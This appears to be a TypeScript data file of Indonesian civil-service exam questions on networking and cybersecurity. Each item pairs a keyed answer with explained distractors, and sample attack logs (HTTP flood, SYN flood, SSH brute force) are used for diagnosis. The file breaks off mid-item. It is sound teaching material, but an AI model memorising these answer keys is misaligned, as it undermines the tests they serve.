import type { SkbHotsItem } from './skb_hots_builder';

export const SKB_JARINGAN_B: SkbHotsItem[] = [
  {
    level: 'C5',
    topik: 'Jaringan - Arsitektur IPv6 Dual-Stack & SLAAC vs DHCPv6',
    pertanyaan:
      'Instansi pemerintah mulai memigrasikan jaringan kampus menuju IPv6 dual-stack sambil mempertahankan kontrol ketat atas pencatatan alamat IP-ke-pegawai untuk kebutuhan audit keamanan (forensik log). Tim jaringan menemukan bahwa dengan SLAAC (*Stateless Address Autoconfiguration*) + *Privacy Extensions* (RFC 4941), alamat IPv6 perangkat pegawai berubah acak secara berkala sehingga sulit ditelusuri di SIEM.\n\nDesain pengelolaan pengalamatan IPv6 manakah yang paling tepat untuk memenuhi kebutuhan tata kelola dan audit instansi?',
    jawabanBenar:
      'Mengonfigurasi Router Advertisement dengan flag `M=1` (Managed Address Configuration) dan `A=0` (mematikan SLAAC pada subnet korporat terkelola) untuk memakai Stateful DHCPv6 yang mencatat lease terpusat ke SIEM, serta mengaktifkan `RA Guard` dan `DHCPv6 Guard` di switch (sambil memverifikasi dukungan perangkat Android yang membutuhkan SLAAC pada VLAN Wi-Fi terpisah dengan logging ND/neighbor table).',
    pengecoh4: [
      'Mengaktifkan protokol NAT66 (translasi alamat IPv6 privat ke satu alamat IPv6 publik tunggal) agar seluruh pegawai berbagi satu alamat IPv6 sehingga tidak perlu melacak perangkat individual.',
      'Menonaktifkan seluruh paket ICMPv6 di firewall internal supaya perangkat tidak bisa melakukan Neighbor Discovery dan dipaksa memakai protokol ARP versi IPv4.',
      'Mengalokasikan blok `/128` untuk setiap subnet VLAN kantor agar hanya satu perangkat yang boleh terhubung pada satu segmen switch.',
      'Menyebarkan alamat link-local `fe80::/10` ke tabel routing BGP internet publik agar seluruh server kantor dapat diakses secara global tanpa alamat Global Unicast.',
    ],
    akarMasalah:
      'SLAAC dengan privacy extensions menghasilkan alamat sementara yang sulit diaudit secara terpusat bila tidak ada korelasi Neighbor Discovery atau pengelolaan lease terpusat.',
    solusiTerbaik:
      'Stateful DHCPv6 (`M=1, A=0`) + `RA Guard`/`DHCPv6 Guard` memberi kendali alokasi dan audit lease terpusat di segmen kabel/terkelola, disertai pemisahan segmen Wi-Fi mobile dengan pencatatan tabel ND (karena Android secara historis tidak mendukung DHCPv6).',
    analisisPengecoh:
      'NAT66 menghilangkan visibilitas per-host dan tidak direkomendasikan di IPv6; memblokir total ICMPv6 melumpuhkan IPv6 (NDP, DAD, PMTUD bergantung pada ICMPv6); `/128` hanya satu alamat host bukan subnet standar `/64`; alamat `fe80::/10` bersifat link-local dan tidak pernah dirutekan antar-subnet/internet.',
  },
  {
    level: 'C6',
    topik: 'Jaringan - Zero-Downtime TLS Certificate Rotation',
    pertanyaan:
      'Sertifikat TLS untuk portal layanan publik utama `portal.pemda.go.id` (melayani 800 request/detik di belakang 4 node HAProxy/Nginx) akan kedaluwarsa dalam 48 jam. Tahun lalu, penggantian sertifikat manual sempat menyebabkan downtime 12 menit karena operator melakukan `systemctl restart nginx` yang memutus seluruh koneksi aktif dan lupa menyertakan *intermediate CA certificate* sehingga aplikasi mobile menolak koneksi.\n\nProsedur dan otomasi pembaruan sertifikat manakah yang paling andal untuk menghilangkan downtime serta kesalahan rantai sertifikat?',
    jawabanBenar:
      'Mengotomatiskan penerbitan dan pembaruan menggunakan protokol ACME (misal Certbot/cert-manager) dengan `fullchain.pem` (leaf + intermediate CA berurutan), memvalidasi konfigurasi dan rantai sertifikat lewat `nginx -t` serta `openssl verify`, lalu menjalankan graceful reload (`systemctl reload nginx`) yang memuat sertifikat baru tanpa memutus koneksi aktif, dilengkapi pemantauan alert 30 hari sebelum kedaluwarsa.',
    pengecoh4: [
      'Menjalankan `systemctl stop nginx`, mengganti berkas sertifikat hanya dengan *leaf certificate* tanpa intermediate CA agar ukuran handshake lebih kecil, lalu menyalakan kembali layanan setelah 5 menit.',
      'Menerbitkan sertifikat self-signed berlaku 20 tahun menggunakan OpenSSL lokal lalu meminta seluruh masyarakat menginstal Root CA buatan instansi ke ponsel masing-masing.',
      'Menonaktifkan protokol HTTPS pada jam 23.00–24.00 WIB setiap tanggal kedaluwarsa dan mengalihkan seluruh trafik login ASN sementara ke HTTP port 80 tanpa enkripsi.',
      'Menyalin file kunci privat (`privkey.pem`) ke repositori Git publik instansi agar keempat server Nginx dapat melakukan `git pull` setiap jam untuk memperbarui sertifikat.',
    ],
    akarMasalah:
      'Hard restart memutus sesi TCP/TLS aktif, ketiadaan intermediate certificate memutus validasi rantai kepercayaan pada klien ketat (Android/iOS/Java), dan proses manual rawan lupa kedaluwarsa.',
    solusiTerbaik:
      'Otomasi ACME + `fullchain` + validasi sintaks/chain sebelum `graceful reload` + monitoring expiry menjamin rotasi zero-downtime dan rantai sertifikat selalu utuh.',
    analisisPengecoh:
      'Tanpa intermediate CA klien mobile gagal memverifikasi rantai kepercayaan; self-signed 20 tahun ditolak semua browser/OS publik; fallback ke HTTP port 80 mengekspos kredensial plaintext; menaruh kunci privat di Git publik adalah kebocoran kriptografi fatal.',
  },
  {
    level: 'C4',
    topik: 'Jaringan - Analisis Bottleneck Tautan lewat NetFlow & SNMP',
    pertanyaan:
      'Tim jaringan mendapati utilisasi antarmuka uplink utama 1 Gbps menuju internet penuh 98% setiap pagi, tetapi grafik SNMP interface (`ifInOctets`/`ifOutOctets`) hanya menunjukkan volume agregat tanpa memberi tahu host atau aplikasi apa yang memakan bandwidth. Di sisi lain, menangkap seluruh paket penuh (`full packet capture`) selama 8 jam pada link 1 Gbps menghabiskan ruang disk server dalam hitungan menit.\n\nInstrumen pemantauan jaringan manakah yang paling tepat diterapkan untuk mengidentifikasi *top talkers* dan protokol dominan secara efisien?',
    jawabanBenar:
      'Mengaktifkan ekspor telemetry berbasis aliran (*flow telemetry*) seperti NetFlow v9 / IPFIX atau sFlow dari core router/switch menuju collector analitik agar metadata aliran (IP sumber/tujuan, port, protokol, jumlah byte/paket) dapat dianalisis real-time dengan overhead penyimpanan sangat kecil dibanding full PCAP.',
    pengecoh4: [
      'Menjalankan `ping -t` dari 50 komputer pegawai secara serentak ke gateway internet lalu mencatat waktu rata-rata milidetik ke dalam lembar kerja Excel.',
      'Mengaktifkan mode debug penuh (`debug ip packet detail`) di konsol CLI core router saat jam puncak 1 Gbps untuk mencetak setiap paket satu per satu ke layar terminal.',
      'Menurunkan interval polling SNMP dari 5 menit menjadi 100 milidetik pada seluruh 200 switch agar OID `ifOutOctets` dapat menampilkan nama domain situs yang dibuka setiap pegawai.',
      'Memutus kabel jaringan tiap lantai gedung secara bergiliran setiap 15 menit hingga grafik SNMP turun di bawah 50% untuk menebak lantai sumber trafik.',
    ],
    akarMasalah:
      'SNMP counter hanya menyediakan metrik agregat per-antarmuka, sedangkan full PCAP tidak ekonomis untuk pemantauan berkelanjutan berkecepatan gigabit.',
    solusiTerbaik:
      'NetFlow/IPFIX/sFlow merangkum aliran trafik (5-tuple + volume) dengan footprint penyimpanan ratusan kali lebih kecil dari PCAP sehingga langsung mengungkap *top talkers*, port/protokol, dan pola anomali.',
    analisisPengecoh:
      'Ping hanya mengukur latensi ICMP, bukan komposisi bandwidth; `debug ip packet` pada router produksi saat beban tinggi berisiko membuat CPU router crash; SNMP `ifOutOctets` tidak berisi informasi host/protokol meski di-poll sangat cepat; memutus lantai secara acak mengganggu layanan operasional.',
  },
  {
    level: 'C6',
    topik: 'Jaringan - Active-Active Multi-Region & DNS Failover',
    pertanyaan:
      'Layanan sistem pengadaan barang dan jasa nasional dijalankan pada dua pusat data terpisah secara geografis (`DC-Jakarta` dan `DC-Surabaya`). Instansi membutuhkan arsitektur agar saat salah satu pusat data mengalami gangguan total (bencana/putus fiber nasional), trafik pengguna otomatis dialihkan ke pusat data sehat dalam waktu kurang dari 2 menit tanpa intervensi operator.\n\nKombinasi komponen infrastruktur jaringan manakah yang paling tepat untuk memenuhi persyaratan tersebut?',
    jawabanBenar:
      'Menggunakan Global Server Load Balancing (GSLB) / Authoritative DNS dengan health-check aktif lintas region dan TTL pendek (30–60 detik) — atau BGP Anycast untuk edge layer — yang otomatis mencabut IP pusat data gagal dari respons DNS/routing, dipadukan dengan replikasi data lintas region sesuai target RPO/RTO.',
    pengecoh4: [
      'Menghubungkan kedua pusat data menggunakan satu kabel VLAN Layer 2 stretched tanpa GSLB dan memasang satu Load Balancer tunggal di `DC-Jakarta` untuk membagi trafik ke `DC-Surabaya`.',
      'Memasang DNS statis dengan nilai `TTL = 86400` yang mengarah ke `DC-Jakarta` saja lalu menyimpan skrip manual di laptop kepala seksi untuk mengubah record saat terjadi bencana.',
      'Menggunakan VRRP (Keepalived) langsung melewati internet publik antara `DC-Jakarta` dan `DC-Surabaya` karena VRRP dirancang khusus untuk sinkronisasi failover antar-kota berjarak 800 km.',
      'Mengarahkan seluruh pengguna di Pulau Jawa ke `DC-Jakarta` secara hard-coded di aplikasi klien tanpa mekanisme fallback sehingga jika `DC-Jakarta` mati, pengguna diminta menunggu pemulihan.',
    ],
    akarMasalah:
      'Failover lintas pusat data geografis membutuhkan deteksi kesehatan terdistribusi di level global dan pengalihan rute/DNS cepat agar tidak bergantung pada satu titik kegagalan (SPOF) di satu lokasi.',
    solusiTerbaik:
      'GSLB/DNS health-checked failover dengan TTL rendah (atau BGP Anycast di edge) otomatis mengalihkan klien ke region sehat di bawah 2 menit, terintegrasi dengan strategi replikasi data.',
    analisisPengecoh:
      'Menaruh satu LB di DC-Jakarta tetap menjadi SPOF saat DC-Jakarta tumbang; TTL 24 jam + perubahan manual melanggar target < 2 menit; VRRP adalah protokol Layer 2 broadcast/multicast lokal yang tidak cocok lintas WAN/internet; hard-coding satu region melumpuhkan ketersediaan saat bencana.',
  },
  {
    level: 'C4',
    topik: 'Jaringan - Diagnosis Masalah CNAME pada Zone Apex (Root Domain)',
    pertanyaan:
      'Administrator ingin mengarahkan root domain (zone apex) `instansi.go.id` langsung ke hostname penyedia CDN global `d12345.cdn-provider.net` agar mendapat IP dinamis CDN. Saat ia mencoba menambahkan record `CNAME` pada apex `instansi.go.id` di server DNS BIND, zona langsung gagal dimuat dengan pesan error:\n\n```log\ndns_master_load: instansi.go.id.zone:14: CNAME and other data\nzone instansi.go.id/IN: loading from master file failed: CNAME and other data\n```\n\nMengapa DNS menolak konfigurasi tersebut secara standar RFC dan bagaimana solusi yang tepat?',
    jawabanBenar:
      'RFC 1034/1912 melarang record `CNAME` hidup berdampingan dengan record lain pada nama yang sama, padahal zone apex wajib memiliki record `SOA` dan `NS` (serta sering `MX`/`TXT`); gunakan mekanisme `ALIAS` / `ANAME` / *CNAME Flattening* yang didukung penyedia DNS modern (yang meresolusi target CDN menjadi record `A`/`AAAA` secara dinamis), atau gunakan `www.instansi.go.id` dengan `CNAME` dan redirect HTTP dari apex.',
    pengecoh4: [
      'Menghapus seluruh record `SOA` dan `NS` dari zone apex `instansi.go.id` agar record `CNAME` dapat berdiri sendiri dan domain tetap dapat diresolusi oleh seluruh ISP dunia.',
      'Mengubah tipe record pada `instansi.go.id` menjadi `PTR` yang menunjuk ke `d12345.cdn-provider.net` karena record `PTR` mengizinkan alias pada zone apex.',
      'Mengganti seluruh alamat IP server CDN menjadi alamat IP privat `192.168.1.1` di dalam record `A` publik agar BIND tidak perlu melakukan pengecekan `SOA`.',
      'Memasang dua record `CNAME` sekaligus pada zone apex `instansi.go.id` agar server DNS BIND mengaktifkan mode load balancing otomatis.',
    ],
    akarMasalah:
      'Standar DNS melarang `CNAME` berdampingan dengan tipe record lain (`SOA`, `NS`, `MX`, `TXT`) pada node nama yang sama, sehingga `CNAME` tidak legal diletakkan di zone apex.',
    solusiTerbaik:
      'CNAME Flattening / `ALIAS` / `ANAME` pada authoritative DNS modern menyintesis respons `A`/`AAAA` secara dinamis tanpa melanggar RFC, atau memakai subdomain `www` untuk `CNAME` disertai apex HTTP redirect.',
    analisisPengecoh:
      'Menghapus `SOA` dan `NS` membuat zona DNS tidak valid dan mati total; `PTR` hanya untuk reverse DNS (IP-ke-nama); IP privat di DNS publik tidak dapat dijangkau dari internet; dua `CNAME` pada satu nama makin melanggar RFC.',
  },
  {
    level: 'C5',
    topik: 'Jaringan - Evaluasi Link Aggregation (LACP 802.3ad) & Load Distribution',
    pertanyaan:
      'Tim jaringan menggabungkan 4 tautan kabel 1 Gbps antara Core Switch dan Storage Server menggunakan LACP (IEEE 802.3ad) menjadi satu kanal logis 4 Gbps. Namun saat server menjalankan satu sesi transfer backup TCP tunggal ke NAS, throughput maksimum mentok di 940 Mbps meskipun 3 kabel lain nyaris kosong. Operator mengira LACP rusak.\n\nEvaluasi penyebab perilaku throughput tersebut dan cara terbaik mengoptimalkannya:',
    jawabanBenar:
      'LACP bukan kerusakan; algoritma hashing port-channel (berbasis pasangan MAC/IP/port) secara sengaja mengarahkan satu aliran (flow) TCP tunggal ke satu tautan fisik yang sama untuk mencegah *out-of-order packets* sehingga kecepatan satu aliran dibatasi 1 Gbps; gunakan multi-stream paralel (misal multi-channel SMB/parallel transfer) dengan algoritma hash L3+L4 (`src-dst-ip-port`), atau tingkatkan tautan fisik ke 10 Gbps jika kecepatan single-flow > 1 Gbps wajib dipenuhi.',
    pengecoh4: [
      'Ubah mode agregasi menjadi round-robin per-paket pada setiap frame Ethernet TCP tunggal agar keempat kabel 1 Gbps langsung memberikan 4 Gbps tanpa memengaruhi urutan paket TCP.',
      'Hapus protokol LACP dan sambungkan keempat kabel tanpa port-channel ke switch yang sama agar Spanning Tree Protocol menggabungkan keempat link menjadi 4 Gbps aktif bersamaan.',
      'Ubah alamat IP Storage Server menjadi empat subnet `/24` berbeda pada satu port-channel yang sama agar satu sesi TCP otomatis terpecah rata ke empat kabel.',
      'Turunkan nilai MTU di Storage Server dari 1500 menjadi 576 byte agar algoritma hashing LACP lebih sering memindahkan paket dari sesi backup tunggal tersebut antar-kabel.',
    ],
    akarMasalah:
      'EtherChannel/LACP mendistribusikan trafik per-flow (berdasarkan hash L2/L3/L4) bukan per-paket, sehingga satu aliran TCP selalu terikat pada kapasitas satu tautan anggota (1 Gbps).',
    solusiTerbaik:
      'Memahami batasan per-flow LACP: pilih kebijakan hashing L3+L4 untuk memanfaatkan agregat 4 Gbps pada banyak aliran/multi-stream paralel, atau migrasi ke link fisik 10G/25G jika beban kerja dominan single-flow.',
    analisisPengecoh:
      'Round-robin per-paket memicu *out-of-order TCP packets* dan fast retransmit yang justru menghancurkan throughput; STP tanpa LACP justru memblokir 3 dari 4 kabel redundan untuk mencegah loop; satu sesi TCP hanya memakai satu pasangan IP sumber-tujuan; mengecilkan MTU tidak mengubah hasil hash flow dan malah menambah overhead.',
  },
  {
    level: 'C4',
    topik: 'Jaringan - Troubleshooting Reverse Proxy 502 vs 504 Gateway Error',
    pertanyaan:
      'Saat jam penutupan pelaporan SPT tahunan, pengguna aplikasi portal pajak melaporkan munculnya error `504 Gateway Time-out` tepat setelah menunggu 60 detik ketika mengunduh rekap tahunan, sementara endpoint ringan `/api/status` tetap mengembalikan `200 OK`. Log Nginx menunjukkan:\n\n```log\n2026/03/31 15:42:10 [error] 182#182: *94120 upstream timed out (110: Connection timed out) while reading response header from upstream, request: "POST /api/rekap/tahunan HTTP/2.0", upstream: "http://10.20.4.11:3000/api/rekap/tahunan"\n```\n\nBagaimana membedakan akar masalah log tersebut dari error `502 Bad Gateway`, dan langkah remediasi paling tepat?',
    jawabanBenar:
      'Error `504` berarti upstream hidup dan menerima request tetapi gagal mengirim header respons dalam batas `proxy_read_timeout` default Nginx (60 detik) akibat proses pembuatan rekap terlalu lambat/sinkron (berbeda dengan `502` yang berarti upstream mati/menolak koneksi/mengirim respons rusak); optimalkan kueri rekap atau ubah ekspor berat menjadi job asinkron (antrean worker + status polling/notifikasi) alih-alih sekadar memperpanjang timeout tanpa batas.',
    pengecoh4: [
      'Error `504` menandakan proses aplikasi Node.js di `10.20.4.11:3000` telah mati (crashed) sehingga Nginx langsung gagal melakukan TCP handshake dalam 1 milidetik.',
      'Menurunkan `proxy_read_timeout` di Nginx dari 60 detik menjadi 5 detik agar server upstream dipaksa mengeksekusi kueri rekap tahunan dua belas kali lebih cepat.',
      'Error `504` pasti disebabkan oleh sertifikat TLS klien yang tidak valid pada HTTP/2.0 sehingga Nginx memutus koneksi setelah 60 detik.',
      'Mengganti kode status `504` menjadi `200 OK` menggunakan `proxy_intercept_errors` di Nginx agar browser wajib pajak tidak menampilkan halaman gagal.',
    ],
    akarMasalah:
      'Pemrosesan laporan tahunan secara sinkron di dalam siklus HTTP request melampaui batas `proxy_read_timeout` 60 detik di Nginx, menyebabkan `504 Gateway Time-out`.',
    solusiTerbaik:
      'Mengubah pembuatan laporan berat menjadi pola asinkron (202 Accepted + background worker + unduhan hasil) sekaligus mengoptimalkan kueri database menyelesaikan akar kelambatan tanpa mengunci worker HTTP.',
    analisisPengecoh:
      'Upstream mati/menolak koneksi menghasilkan `502 Bad Gateway` (Connection Refused), bukan `504` setelah 60 detik; menurunkan timeout ke 5 detik hanya mempercepat kegagalan; kesalahan TLS terjadi di fase handshake bukan saat membaca response header upstream; menyamarkan 504 menjadi 200 merusak keandalan layanan.',
  },
  {
    level: 'C5',
    topik: 'Jaringan - Manajemen Out-of-Band (OOB) & Pemulihan Perangkat Inti',
    pertanyaan:
      'Seorang administrator jaringan melakukan perubahan aturan ACL pada router perimeter utama dari jarak jauh melalui sesi SSH in-band. Akibat kesalahan penulisan wildcard mask, ia tanpa sengaja memblokir akses SSH dan seluruh trafik manajemen dari subnet kantor pusat sehingga router tidak lagi dapat dijangkau dari jaringan produksi.\n\nDesain operasional jaringan manakah yang paling tepat diterapkan agar kesalahan konfigurasi perangkat inti tidak lagi menyebabkan isolasi total?',
    jawabanBenar:
      'Menyediakan jaringan manajemen *Out-of-Band (OOB)* terpisah (console server serial / antarmuka manajemen khusus pada jalur independen) serta memanfaatkan fitur *commit confirmed* / jadwal `reload in` otomatis sebelum menerapkan perubahan ACL/routing kritis sehingga konfigurasi otomatis rollback bila administrator kehilangan akses.',
    pengecoh4: [
      'Mengizinkan akses Telnet port 23 terbuka dari seluruh internet (`0.0.0.0/0`) sebagai jalur cadangan darurat jika akses SSH internal terblokir oleh aturan ACL.',
      'Menyimpan seluruh konfigurasi router pada mode tanpa autentikasi password agar siapa pun di jaringan lokal dapat masuk memperbaiki ACL yang keliru.',
      'Menonaktifkan seluruh aturan ACL dan firewall pada router perimeter secara permanen agar administrator tidak pernah berisiko salah mengetik wildcard mask.',
      'Menjadwalkan reboot otomatis router perimeter setiap 1 jam sekali sepanjang tahun agar setiap kesalahan konfigurasi hilang sebelum dilaporkan pengguna.',
    ],
    akarMasalah:
      'Mengelola perangkat inti hanya lewat jalur in-band tanpa mekanisme rollback otomatis membuat satu kesalahan konfigurasi ACL langsung memutus akses pemulihan jarak jauh.',
    solusiTerbaik:
      'Jalur manajemen OOB (terisolasi dari data-plane produksi) + fitur `commit confirmed` / timed rollback memberi jaring pengaman operasional tanpa mengorbankan keamanan.',
    analisisPengecoh:
      'Membuka Telnet ke internet mengekspos kredensial plaintext dan mengundang pengambilalihan router; meniadakan password atau firewall melanggar dasar keamanan; reboot setiap jam menyebabkan downtime berulang di produksi.',
  },
  {
    level: 'C4',
    topik: 'Jaringan - Troubleshooting VPN Site-to-Site IPsec Phase 1 vs Phase 2',
    pertanyaan:
      'Koneksi VPN Site-to-Site IPsec antara Dinas Pusat dan Dinas Cabang gagal terhubung setelah pembaruan perangkat di cabang. Pemeriksaan log IKEv2 pada router pusat menampilkan:\n\n```log\nIKE_SA_INIT response received: AES_CBC_256 / HMAC_SHA2_256 / DH_GROUP_14 -> IKE_SA established\nCREATE_CHILD_SA failed: NO_PROPOSAL_CHOSEN (local TS: 10.10.0.0/16, remote TS: 10.20.0.0/16 vs peer offered 10.20.1.0/24)\n```\n\nBerdasarkan log tersebut, tahap negosiasi IPsec manakah yang gagal dan perbaikan apa yang diperlukan?',
    jawabanBenar:
      'Phase 1 (`IKE_SA`) sudah berhasil terbentuk, tetapi Phase 2 (`CHILD_SA`/IPsec SA) gagal dengan `NO_PROPOSAL_CHOSEN` karena ketidakcocokan *Traffic Selector* (interesting traffic/encryption domain `10.20.0.0/16` vs `10.20.1.0/24`) atau parameter transform set Phase 2; samakan definisi Traffic Selector (atau beralih ke Route-Based VPN VTI dengan `0.0.0.0/0`) serta samakan algoritma ESP di kedua peer.',
    pengecoh4: [
      'Pre-Shared Key (PSK) pada Phase 1 salah ketik sehingga router pusat tidak pernah berhasil menyelesaikan negosiasi `IKE_SA_INIT` dengan router cabang.',
      'Firewall ISP memblokir protokol UDP port 500 dan 4500 sehingga tidak ada satu pun paket IKEv2 yang berhasil melintas antara Dinas Pusat dan Dinas Cabang.',
      'Algoritma `AES_CBC_256` dan `DH_GROUP_14` sudah usang dan tidak boleh digunakan pada Phase 1 sehingga kedua peer harus diturunkan ke algoritma `DES` dan `MD5`.',
      'Jaringan kedua dinas menggunakan alamat IP privat `10.x.x.x` yang secara spesifikasi IKEv2 dilarang dienkapsulasi di dalam terowongan VPN Site-to-Site.',
    ],
    akarMasalah:
      'Log `IKE_SA established` memastikan Phase 1 dan konektivitas UDP 500/4500 sukses; kegagalan spesifik pada `CREATE_CHILD_SA` (`NO_PROPOSAL_CHOSEN`) disebabkan ketidakcocokan Traffic Selector Phase 2 antara kedua ujung.',
    solusiTerbaik:
      'Menyamakan subnet Traffic Selector (serta cipher ESP/PFS Phase 2) di kedua sisi — atau memakai Route-Based VPN (VTI) dengan routing dinamis — segera membentuk `CHILD_SA`.',
    analisisPengecoh:
      'Jika PSK salah atau UDP 500/4500 diblokir, `IKE_SA` tidak akan pernah mencapai status `established`; menurunkan ke DES/MD5 menghancurkan keamanan kriptografi; IP privat RFC 1918 justru adalah trafik utama yang dienkapsulasi dalam VPN Site-to-Site.',
  },
  {
    level: 'C6',
    topik: 'Jaringan - Optimasi Pengiriman Konten Publik dengan CDN & Origin Shield',
    pertanyaan:
      'Saat pengumuman hasil seleksi CPNS, portal pengumuman menerima lonjakan 120.000 pengunjung bersamaan yang mengunduh berkas PDF hasil pengumuman berukuran 8 MB. Server origin instansi hanya memiliki uplink 1 Gbps sehingga langsung jenuh dan tidak dapat diakses dalam 30 detik pertama.\n\nRancangan infrastruktur pengiriman konten manakah yang paling tepat dan hemat biaya agar pengumuman tetap responsif di bawah lonjakan trafik tersebut?',
    jawabanBenar:
      'Meletakkan berkas statis pengumuman di Object Storage yang disajikan melalui Content Delivery Network (CDN) dengan `Cache-Control: public, max-age=3600, immutable` dan fitur *Origin Shield* / request collapsing, membatasi akses origin hanya dari rentang IP CDN (atau Origin Access Control), serta menyajikan halaman statis ringan di edge.',
    pengecoh4: [
      'Menyimpan berkas PDF 8 MB tersebut sebagai kolom `BLOB` di dalam tabel PostgreSQL lalu melayani setiap permintaan unduhan melalui kueri `SELECT` langsung dari server aplikasi utama.',
      'Memasang 40 server database replika di pusat data lokal tanpa mengubah uplink internet 1 Gbps agar setiap warga memperoleh koneksi database khusus saat mengunduh PDF.',
      'Mengirimkan berkas PDF 8 MB sebagai lampiran email massal ke seluruh 120.000 pelamar secara serentak dari mail server internal kantor yang menggunakan uplink 1 Gbps yang sama.',
      'Membatasi bandwidth setiap pengunjung menjadi 10 Kbps pada router perimeter agar seluruh 120.000 pengguna dapat mengunduh PDF secara bersamaan selama 2 jam.',
    ],
    akarMasalah:
      '120.000 unduhan berkas 8 MB secara serentak membutuhkan kapasitas ratusan Gbps sehingga mustahil dilayani langsung oleh uplink 1 Gbps origin server.',
    solusiTerbaik:
      'Object Storage + CDN edge caching + Origin Shield menyerap >99% permintaan di edge PoP terdekat pengguna sehingga trafik ke origin nyaris nol, jauh lebih skalabel dan efisien.',
    analisisPengecoh:
      'Menyimpan PDF di `BLOB` DB dan menambah replika tidak menghilangkan bottleneck uplink 1 Gbps; email massal 120.000×8 MB (~960 GB) langsung menyumbat uplink dan memicu blacklist spam; throttling 10 Kbps membuat pengunduhan memakan waktu lebih dari 1,5 jam dan memicu timeout klien.',
  },
  {
    level: 'C4',
    topik: 'Keamanan Siber - Analisis Log Nginx terhadap L7 HTTP Flood & Mitigasi',
    pertanyaan:
      'Portal layanan publik mendadak lambat parah dan CPU server aplikasi mencapai 100%, padahal volume trafik bandwidth hanya 45 Mbps (masih jauh di bawah kapasitas 1 Gbps). Pemeriksaan cepat pada `access.log` Nginx memperlihatkan pola berikut yang berulang ribuan kali per detik dari ribuan alamat IP berbeda:\n\n```log\n185.220.101.4 - - [14/May/2026:09:11:02 +0700] "GET /api/pencarian?q=a9f81c HTTP/1.1" 200 18420 "-" "Mozilla/5.0"\n194.26.135.88 - - [14/May/2026:09:11:02 +0700] "GET /api/pencarian?q=7bc21e HTTP/1.1" 200 18420 "-" "Mozilla/5.0"\n45.142.212.19 - - [14/May/2026:09:11:02 +0700] "GET /api/pencarian?q=3de90f HTTP/1.1" 200 18420 "-" "Mozilla/5.0"\n```\n\nPola serangan apa yang ditunjukkan log tersebut dan kombinasi mitigasi paling efektif?',
    jawabanBenar:
      'Terjadi serangan *Layer 7 HTTP Flood* yang menargetkan endpoint berat (`/api/pencarian`) sambil melakukan *cache busting* lewat parameter query acak (`?q=...`); terapkan mitigasi berlapis di edge/WAF berupa rate limiting adaptif, tantangan bot/JS challenge (managed challenge) pada endpoint pencarian, normalisasi/validasi parameter query, serta batas konkurensi upstream.',
    pengecoh4: [
      'Terjadi serangan volumetrik *UDP Amplification* di Layer 3/4 sehingga cukup menaikkan kapasitas pipa internet dari 1 Gbps menjadi 10 Gbps tanpa menyentuh konfigurasi WAF/Nginx.',
      'Memblokir satu per satu ribuan alamat IP sumber secara manual di `iptables` setiap menit tanpa mengaktifkan tantangan bot atau proteksi Layer 7.',
      'Menonaktifkan logging akses Nginx (`access_log off`) karena penulisan teks log ke disk adalah satu-satunya penyebab CPU server aplikasi backend mencapai 100%.',
      'Mengaktifkan kompresi `gzip_comp_level 9` pada Nginx untuk setiap respons `/api/pencarian` agar penyerang kehabisan CPU saat mendekompresi halaman.',
    ],
    akarMasalah:
      'Serangan DDoS Layer 7 tidak membutuhkan bandwidth besar, melainkan menghabiskan CPU/DB backend lewat ribuan permintaan GET ke endpoint pencarian dengan query string acak untuk melewati cache.',
    solusiTerbaik:
      'Proteksi Layer 7 (WAF bot/JS challenge, rate limiting per-IP/fingerprint/ASN, proteksi endpoint mahal) menyaring trafik otomatis di lapisan edge sebelum mencapai aplikasi dan database.',
    analisisPengecoh:
      'Bandwidth hanya 45 Mbps membuktikan ini bukan UDP volumetric flood; blokir IP manual tidak mengejar rotasi botnet; mematikan log menghilangkan bukti forensik tanpa menghentikan beban backend; `gzip_comp_level 9` justru menambah beban CPU di server sendiri.',
  },
  {
    level: 'C4',
    topik: 'Keamanan Siber - Mitigasi TCP SYN Flood & SYN Cookies',
    pertanyaan:
      'Server web portal pengaduan tidak bisa menerima koneksi baru dari masyarakat meskipun CPU dan memori terlihat rendah. Tim jaringan menjalankan pemeriksaan soket di server Linux dan menemukan kondisi berikut:\n\n```log\n$ ss -tan state syn-recv | wc -l\n4096\n$ dmesg | tail -n 2\n[84210.14] TCP: request_sock_TCP: Possible SYN flooding on port 443. Dropping request.\n```\n\nApa yang sedang terjadi pada stack TCP server tersebut dan mekanisme pertahanan paling tepat?',
    jawabanBenar:
      'Terjadi serangan *TCP SYN Flood* yang memenuhi antrean koneksi setengah terbuka (`SYN_RECV` backlog) dengan paket SYN palsu tanpa menyelesaikan ACK; aktifkan `net.ipv4.tcp_syncookies = 1` (serta SYN Proxy di firewall/edge DDoS scrubber), tuning `tcp_max_syn_backlog`/`somaxconn`, dan kurangi `tcp_synack_retries`.',
    pengecoh4: [
      'Terjadi kebocoran memori pada aplikasi web JavaScript sehingga cukup menambahkan RAM fisik tanpa mengubah konfigurasi kernel TCP maupun proteksi edge.',
      'Menonaktifkan `three-way handshake` TCP pada kernel Linux agar setiap klien langsung mengirim data HTTP tanpa menunggu paket `SYN-ACK`.',
      'Memperpanjang `tcp_synack_retries` dari 5 menjadi 25 kali agar server lebih sabar menunggu balasan ACK dari alamat IP sumber yang dipalsukan.',
      'Memblokir seluruh paket dengan flag `TCP SYN` menuju port 443 pada firewall perimeter agar antrean `SYN_RECV` kembali kosong menjadi nol.',
    ],
    akarMasalah:
      'Penyerang membanjiri paket `TCP SYN` (sering dengan IP sumber spoofed) sehingga tabel `SYN_RECV` penuh (4096) dan koneksi sah pengguna baru ditolak (`Dropping request`).',
    solusiTerbaik:
      '`SYN Cookies` (dan SYN Proxy di firewall/scrubber) menyandikan state koneksi dalam *Initial Sequence Number* tanpa mengalokasikan memori tabel `SYN_RECV` hingga klien membuktikan keabsahannya lewat `ACK` valid.',
    analisisPengecoh:
      'Menambah RAM tidak menyelesaikan batas antrean backlog maupun spoofing; TCP handshake tidak dapat dinonaktifkan; menaikkan `tcp_synack_retries` justru memperpanjang penguncian slot; memblokir semua paket SYN ke port 443 mematikan layanan HTTPS untuk seluruh masyarakat.',
  },
  {
    level: 'C5',
    topik: 'Keamanan Siber - Analisis Log SSH & Pengamanan Bastion Host',
    pertanyaan:
      'Audit keamanan menemukan server database produksi memiliki port SSH 22 terbuka ke internet dan log `/var/log/auth.log` mencatat 40.000 percobaan gagal per hari:\n\n```log\nMay 14 02:14:11 db-prod sshd[9120]: Failed password for root from 198.51.100.42 port 51204 ssh2\nMay 14 02:14:12 db-prod sshd[9122]: Failed password for invalid user admin from 198.51.100.42 port 51210 ssh2\n```\n\nRancangan pengamanan akses administratif manakah yang paling sesuai prinsip *hardening* dan *least privilege*?',
    jawabanBenar:
